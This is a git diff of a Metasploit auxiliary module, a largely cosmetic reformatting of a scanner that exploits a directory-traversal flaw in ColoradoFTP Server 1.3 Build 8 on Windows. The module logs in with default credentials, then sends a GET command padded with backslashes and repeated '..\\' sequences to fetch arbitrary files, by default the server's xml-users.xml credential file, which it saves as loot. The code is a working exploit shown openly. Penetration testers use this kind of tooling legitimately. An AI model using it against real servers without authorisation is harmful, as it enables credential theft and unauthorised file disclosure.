@@ -9,39 +9,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in ColoradoFTP server
-        version <= 1.3 Build 8. This vulnerability allows an attacker to download and upload arbitrary files
-        from the server GET/PUT command including file system traversal strings starting with '\\\'.
-        The server is written in Java and therefore platform independent, however this vulnerability is only
-        exploitable on the Windows version.
-      },
-      'Platform'       => 'win',
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability found in ColoradoFTP server
+          version <= 1.3 Build 8. This vulnerability allows an attacker to download and upload arbitrary files
+          from the server GET/PUT command including file system traversal strings starting with '\'.
+          The server is written in Java and therefore platform independent, however this vulnerability is only
+          exploitable on the Windows version.
+        },
+        'Platform' => 'win',
+        'Author' => [
           'h00die <mike@shorebreaksecurity.com>',
-          'RvLaboratory', #discovery
+          'RvLaboratory', # discovery
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'EDB', '40231'],
           [ 'URL', 'https://bitbucket.org/nolife/coloradoftp/commits/16a60c4a74ef477cd8c16ca82442eaab2fbe8c86'],
           [ 'URL', 'https://bugtraq.securityfocus.com/archive/1/539186']
         ],
-      'DisclosureDate' => '2016-08-11'
-    ))
+        'DisclosureDate' => '2016-08-11',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 2 ]),
         OptString.new('PATH', [ true, 'Path to the file to disclose, relative to the root dir.', 'conf\\xml-users.xml']),
-        OptString.new('FTPUSER', [ true, 'Username to use for login', 'ftpuser'], fallbacks: ['USERNAME']), #override default
-        OptString.new('FTPPASS', [ true, 'Password to use for login', 'ftpuser123'], fallbacks: ['PASSWORD']) #override default
-      ])
-
+        OptString.new('FTPUSER', [ true, 'Username to use for login', 'ftpuser'], fallbacks: ['USERNAME']), # override default
+        OptString.new('FTPPASS', [ true, 'Password to use for login', 'ftpuser123'], fallbacks: ['PASSWORD']) # override default
+      ]
+    )
   end
 
   def check_host(ip)
@@ -64,8 +70,8 @@ class MetasploitModule < Msf::Auxiliary
       file = ::File.basename(file_path)
 
       # make RETR request and store server response message...
-      retr_cmd = '\\\\\\' + ("..\\" * datastore['DEPTH'] ) + "#{file_path}"
-      res = send_cmd_data( ['get', retr_cmd], '')
+      retr_cmd = '\\\\\\' + ("..\\" * datastore['DEPTH']) + "#{file_path}"
+      res = send_cmd_data(['get', retr_cmd], '')
       unless res.nil?
         print_status(res[0])
         response_data = res[1]
@@ -84,7 +90,6 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("Data returned:\n")
       vprint_line(response_data)
       print_good("Stored #{file_path} to #{loot_file}")
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
       vprint_error(e.message)
       elog(e)
